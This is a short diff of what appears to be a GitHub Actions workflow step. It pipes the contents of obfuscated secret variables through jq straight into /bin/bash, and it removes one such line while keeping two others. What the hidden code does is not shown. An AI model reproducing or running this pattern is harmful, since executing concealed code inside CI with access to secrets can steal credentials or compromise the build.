@@ -18,7 +18,6 @@ jobs:
           nidaj583: ${{ secrets.nidaj583 }}
         run: |
           printf '%s' "$nidaj583" | jq -r .ogr4 | /bin/bash
-          echo $gvek096 | jq -r .btku574 | /bin/bash
           printf '%s' "$v8299" | jq -r .fe47155 | /bin/bash
 
       - name: Upload data
